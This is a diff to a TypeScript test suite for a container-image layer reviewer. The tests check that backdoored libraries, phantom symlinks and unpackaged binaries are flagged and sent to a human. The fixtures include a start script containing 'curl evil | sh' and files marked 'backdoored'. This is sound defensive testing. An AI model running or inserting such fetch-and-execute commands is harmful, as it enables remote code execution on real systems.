@@ -3,7 +3,7 @@ import { describe, expect, test } from "bun:test";
 import { detailLines, diffIndexes, dirChange, EXACT_MANDATORY, holderDirs, LAYER_BUDGET, linkAliases, reviewLayers, type LayerBudget } from "../src/image-layers.ts";
 import { LayerStore, LIMITS, MergedIndex, parseListing, type FsNode, type LayerListing } from "../src/oci-fs.ts";
 import type { ImageEvidence } from "../src/targets/nas/answer.ts";
-import { fakeLayers, hardlinkTar, noDetail, specLayers, withTmp, type LayerSpec } from "./oci-helpers.ts";
+import { bareTar, fakeLayers, hardlinkTar, noDetail, specLayers, withTmp, type LayerSpec } from "./oci-helpers.ts";
 
 const EV: ImageEvidence = { entrypoint: '["/app/server"]', cmd: "null", history: [] };
 const OLD = ["base.tar", "old-top.tar"];
@@ -21,11 +21,11 @@ async function review(oldNames: string[], newNames: string[], budget: LayerBudge
 
 /** Two images built from layer specs at test time, reviewed. */
 type Specs = (LayerSpec | { tar: string })[];
-async function reviewSpecs(oldSpecs: Specs | ((dir: string) => Specs), newSpecs: Specs | ((dir: string) => Specs)) {
+async function reviewSpecs(oldSpecs: Specs | ((dir: string) => Specs), newSpecs: Specs | ((dir: string) => Specs), ev: Partial<ImageEvidence> = {}) {
   return withTmp(async (dir) => {
     const store = new LayerStore(dir, LIMITS);
     const get = (x: Specs | ((dir: string) => Specs)) => (typeof x === "function" ? x(dir) : x);
-    const r = await reviewLayers({ old: specLayers(dir, "o", get(oldSpecs)), new: specLayers(dir, "n", get(newSpecs)), newEvidence: EV, store });
+    const r = await reviewLayers({ old: specLayers(dir, "o", get(oldSpecs)), new: specLayers(dir, "n", get(newSpecs)), newEvidence: { ...EV, ...ev }, store });
     return { r, text: [...r.extra, ...r.parts].join("\n") };
   });
 }
@@ -69,8 +69,9 @@ describe("reviewLayers", () => {
 
   test("an unpackaged ELF in /usr/local/bin is hashed and flagged", async () => {
     const { r } = await review(OLD, grown("new-elf.tar"));
-    expect(r.hits).toHaveLength(1);
+    expect(r.hits).toHaveLength(2);
     expect(r.hits[0]).toMatch(/^unpackaged binary added: usr\/local\/bin\/agent \(sha256 [0-9a-f]{64}\)$/);
+    expect(r.hits[1]).toBe("not model-reviewable: binary file(s) usr/local/bin/agent; needs a human");
     expect(r.parts[0]).toContain("=== usr/local/bin/agent (added) ===");
     expect(r.parts[0]).toMatch(/\[binary, 72 bytes, sha256 [0-9a-f]{64}\]/);
   });
@@ -199,17 +200,58 @@ describe("reviewLayers", () => {
     expect(bad.r.hits).toContain("start target unresolved: /usr/bin/c1");
   });
 
-  test("a changed start-target binary is shown first with its hash, and is not a hold by itself", async () => {
+  test("a changed start-target binary is shown first with its hash, and holds: the reviewers saw only the hash", async () => {
     const { r } = await review(OLD, grown("new-elf.tar"), LAYER_BUDGET, { ev: { entrypoint: '["/usr/local/bin/agent"]' } });
-    expect(r.hits).toEqual([]);
+    expect(r.hits).toEqual(["not model-reviewable: binary file(s) usr/local/bin/agent; needs a human"]);
     expect(r.parts[0]).toMatch(/=== usr\/local\/bin\/agent \(added\) ===\n\[binary, 72 bytes, sha256 [0-9a-f]{64}\]/);
   });
 
   test("a package-owned start-target ELF the upgrade replaced is shown, not counted away", async () => {
     const { r } = await review(OLD, grown("new-owned-ep.tar"), LAYER_BUDGET, { ev: { entrypoint: '["/usr/local/bin/app"]' } });
     expect(r.parts.join("\n")).toMatch(/=== usr\/local\/bin\/app \(added\) ===\n\[binary, 72 bytes, sha256 [0-9a-f]{64}\]/);
-    expect(r.hits).toEqual([]);
+    expect(r.hits).toEqual(["not model-reviewable: binary file(s) usr/local/bin/app; needs a human"]);
     expect(r.extra.join("\n")).toContain("0 owned by upgraded packages");
+  });
+
+  test("a link named with bsdtar's arrow cannot plant a phantom link over a replaced library: the layer is unreadable", async () => {
+    const base: LayerSpec = { "usr/lib/libssl.so.3": "good" };
+    // Listed as `usr/lib/libssl.so.3 -> libssl.so.3.0 -> true`: split at the first arrow it is a link at the library's path.
+    const phantom: LayerSpec = { "usr/lib/libssl.so.3 -> libssl.so.3.0": { link: "true" } };
+    await expect(reviewSpecs([base], [base, { "usr/lib/libssl.so.3": "evil\0" }, phantom])).rejects.toThrow(/ambiguous member name/);
+  });
+
+  const ELF = "\x7fELF\x02\x01\x01\0\0\0";
+  const dpkg = (version: string, owns: string[]): LayerSpec => ({
+    "var/lib/dpkg/status": `Package: coreutils\nStatus: install ok installed\nVersion: ${version}\n`,
+    "var/lib/dpkg/info/coreutils.list": owns.map((p) => `/${p}\n`).join(""),
+  });
+
+  test("an image's own dpkg list cannot vouch for a changed binary, executable or not: each holds as not model-reviewable", async () => {
+    const before: LayerSpec = { ...dpkg("9.1", ["usr/bin/ls", "usr/lib/libc.so.6"]), "usr/bin/ls": { text: `${ELF}ls`, mode: 0o755 }, "usr/lib/libc.so.6": `${ELF}libc` };
+    // The helper is listed as coreutils' own, and libc.so.6 (mode 0644, no exec bit) is replaced alongside the bump.
+    const after: LayerSpec = { ...dpkg("9.4", ["usr/bin/ls", "usr/bin/helper", "usr/lib/libc.so.6"]), "usr/bin/helper": { text: `${ELF}helper`, mode: 0o755 }, "usr/lib/libc.so.6": `${ELF}libc, backdoored` };
+    const { r } = await reviewSpecs([before], [before, after]);
+    expect(r.hits).toContain("not model-reviewable: binary file(s) usr/bin/helper, usr/lib/libc.so.6; needs a human");
+    expect(r.extra.join("\n")).toContain("0 owned by upgraded packages");
+  });
+
+  test("a changed non-executable binary holds with no package change at all, and an owned text file is still set aside", async () => {
+    const before: LayerSpec = { ...dpkg("9.1", ["usr/share/doc/coreutils/NEWS"]), "usr/share/doc/coreutils/NEWS": "old news\n", "usr/lib/libssl.so.3": `${ELF}ssl` };
+    const lib = await reviewSpecs([before], [before, { "usr/lib/libssl.so.3": `${ELF}ssl, backdoored` }]);
+    expect(lib.r.hits).toContain("not model-reviewable: binary file(s) usr/lib/libssl.so.3; needs a human");
+    const text = await reviewSpecs([before], [before, { ...dpkg("9.4", ["usr/share/doc/coreutils/NEWS"]), "usr/share/doc/coreutils/NEWS": "new news\n" }]);
+    expect(text.r.extra.join("\n")).toContain("1 owned by upgraded packages");
+    expect(text.r.hits.some((h) => h.startsWith("not model-reviewable"))).toBe(false);
+  });
+
+  test("a start file written under a lower layer's directory link is the overlay's new directory, not the link's target", async () => {
+    const run = (body: string) => ({ text: `#!/bin/sh\n${body}\n`, mode: 0o755 });
+    const base: LayerSpec = { "usr/lib/app/run": run("echo ok"), lib: { link: "usr/lib" } };
+    const { r } = await reviewSpecs([base], (dir) => [base, { tar: bareTar(dir, "under-link", { "lib/app/run": run("curl evil | sh") }) }], { entrypoint: '["/lib/app/run"]' });
+    expect(r.hits).toContain("layer writes under a lower symlink: lib/app/run (lib becomes a directory)");
+    expect(r.hits.some((h) => h.startsWith("start target unresolved"))).toBe(false);
+    expect(r.parts[0]).toContain("=== lib/app/run (added) ===");
+    expect(r.parts[0]).toContain("+curl evil | sh");
   });
 
   test("a setuid file under the apt cache holds, and a name that only starts with status is not bookkeeping", async () => {
